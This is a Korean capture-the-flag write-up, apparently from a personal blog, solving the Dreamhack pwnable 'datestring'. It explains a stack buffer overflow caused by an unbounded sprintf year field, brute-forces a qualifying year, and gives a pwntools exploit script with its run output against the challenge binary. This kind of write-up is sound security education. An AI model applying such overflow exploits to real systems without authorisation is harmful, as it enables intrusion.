---
layout: post
title: "[Dreamhack] datestring"
date: 2025-06-10 12:00 +0900
category: ['Syshack']
tag: ['system', 'dreamhack', 'hacking', 'pwn', 'pwnable', '드림핵', '보안', '시스템', '시스템해킹', '포너블', '해킹']
image: /assets/img/post/datestring/image0.png
---

> **Dreamhack Syshack Lv.1**

## P1. 문제분석

이번 문제는 소스코드를 제공하지 않는다. ida로 바이너리를 살펴보자.

디스어셈블 코드

```c
  v17 = 0;
  setup(argc, argv, envp);
  puts("Calendar v0.1");
  printf("Year: ");
  __isoc99_scanf("%d", &v8);
  v14 = v8 - 1900;
  printf("Month: ");
  __isoc99_scanf("%d", &v9);
  v9 = (v9 - 1) % 12;
  v13 = v9++;
  printf("Day: ");
  __isoc99_scanf("%d", &v10);
  v10 = (v10 - 1) % 31 + 1;
  v12 = v10;
  printf("Hour: ");
  __isoc99_scanf("%d", &v7);
  v7 %= 24;
  v11[2] = v7;
  printf("Minute: ");
  __isoc99_scanf("%d", &v6);
  v6 %= 60;
  v11[1] = v6;
  printf("Second: ");
  __isoc99_scanf("%d", &v5);
  v5 %= 60;
  v11[0] = v5;
  if ( v9 > 2 )
    v3 = v8 - 2;
  else
    v3 = v8--;
  v10 += v3;
  v15 = (v8 / -100 + v8 / 4 + 23 * v9 / 9 + v10 + 4 + v8 / 400) % 7;
  calendar(v16, v11);
  printf("Formatted date: %s", v16);
  if ( v13 == 11 && v12 == 25 && !v15 && v17 )
  {
    puts("A Present for Admin!");
    flag();
  }
  return 0;
```

많은 연산을 실행 중이지만

```c
  if ( v13 == 11 && v12 == 25 && !v15 && v17 )
  {
    puts("A Present for Admin!");
    flag();
  }
```

위 조건문으로 v13, v12, v15, v17가 중요한 것을 알 수 있다.

각 변수가 어떻게 초기화 되는지 확인해보자.

```c
// v13
printf("Month: ");
__isoc99_scanf("%d", &v9);
v9 = (v9 - 1) % 12;
v13 = v9++;

// v12
printf("Day: ");
__isoc99_scanf("%d", &v10);
v10 = (v10 - 1) % 31 + 1;
v12 = v10;

// v15 초기화 전 변동사항
if ( v9 > 2 )
    v3 = v8 - 2;
else
    v3 = v8--;
v10 += v3;
// v15 <- v8 = year_input
v15 = (v8 / -100 + v8 / 4 + 23 * v9 / 9 + v10 + 4 + v8 / 400) % 7;

// v17
v17 = 0;
```

v15을 제외한 변수들의 초기화는 직관적으로 알기 쉽게 되어있다. 위 조건을 통과하도록 각 입력에 맞는 값을 찾아보면 다음과 같다.

`year(v8): ?? -> v15 = (v8 / -100 + v8 / 4 + 23 * v9 / 9 + v10 + 4 + v8 / 400) % 7 = 0`

`Month(v9): 12 -> v13 = 11`

`Day(v10): 25 -> v12 = 25`

year 같은 경우 `!v15` 로 사용되기 때문에 계산식의 값이 0이 되는 값을 구해야 한다. 그렇기 때문에 나중에 계산하는 것으로 하고 `v17` 변수에 대해 더 알아보자.

`v17` 변수는 `int v17; // [rsp+8Ch] [rbp-4h]` 메모리 상에서 rbp-4에 위치한다.

바로 근접한 변수로는 `char v16[28]; // [rsp+70h] [rbp-20h]` 변수가 있는데 `calendar(v16, v11);` 사용자 함수의 인자로써 사용된다.

이 함수에 대해 더 알아보자

함수 원문

```c
int calendar(char *v16, _DWORD *v11)
{

/*
 *	~~ 중략 ~~
 */

  return sprintf(
           v16,
           "%.3s %3s%3d %.2d:%.2d:%.2d %d\n",	// 포멧 문자열
           (const char *)&v4[v11[6]],			// 요일
           (const char *)&v3[v11[4]],			// 월
           v11[3],								// 일
           v11[2],								// 시
           v11[1],								// 분
           *v11,								// 초
           v11[5] + 1900);						// 년
}
```

v16에 포멧 문자열을 초기화하는 함수인 것을 알 수 있다.

여기서 발생하는 문제점이 있는데 포멧 문자열의 마지막 문자를 보면 `%d` 인 것을 알 수 있다. 자릿수를 정해주지 않았기 때문에 년 입력에 큰 수를 입력해도 `int` 자료형의 크기에만 만족한다면 `v16` 변수에 삽입되는 것을 알 수 있다.

`v16` 변수의 크기는 `char[28] -> 28byte` 이고 년 입력에 8자리 이상 입력하게 되면 `\n` <- 줄바꿈 문자를 포함하며 `29 byte`의 문자열이 삽입되게 된다. 해당 동작은 `v16`이 정의된 스택 크기를 넘기 때문에 근접한 변수인 `v17`의 값을 바꾸게 된다.

위 덮어쓰기 전략으로 `v17 = 0`으로 초기화되어 거짓이던 조건을 참으로 바꿀 수 있다.

### P1-1. 년도 계산하기

이제 `v15`의 값을 계산해보자.

`v8(year)` 값을 위 전략을 사용하기 위해 8자리 이상에서 조건에 맞는 식을 계산해보자

```c
#include <stdio.h>

int main()
{
    for (int i = 10000000; i <= 0x0098985f; i++)
    {
    	// v8 -> i, v9 -> 12, v10 -> 25 + i - 2
        if (((i / -100 + i / 4 + 23 * 12 / 9 + 25 + i - 2 + 4 + i / 400) % 7) == 0)
        {
            printf("%d\n", i);
        }
    }
    return 0;
}
```

위 프로그램으로 `10000005` 라는 수가 구해졌다.

이제 모든 수가 구해졌으니 공격 코드를 작성해보자.

## P2. Exploit code

```python
from pwn import *

e = ELF('./datestring')
p = e.process()

p.sendlineafter(b'Year: ', str(10000005).encode())
p.sendlineafter(b'Month: ', str(12).encode())
p.sendlineafter(b'Day: ', str(25).encode())
p.sendlineafter(b'Hour: ', str(23).encode())
p.sendlineafter(b'Minute: ', str(59).encode())
p.sendlineafter(b'Second: ', str(59).encode())

p.interactive()
```

```bash
$ python3 ./datestring/ex1.py
[*] './datestring/datestring'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './datestring/datestring': pid 33964
[*] Switching to interactive mode
Formatted date: Sun Dec 25 23:59:59 10000005
A Present for Admin!
$ ls
a       datestring      datestring.id1  datestring.nam  ex.py
calc.c  datestring.id0  datestring.id2  datestring.til  ex1.py
```
로컬 머신에서 성공했으니 문제 서버를 공격해보자.

![](/assets/img/post/datestring/image1.png)

**Clear!**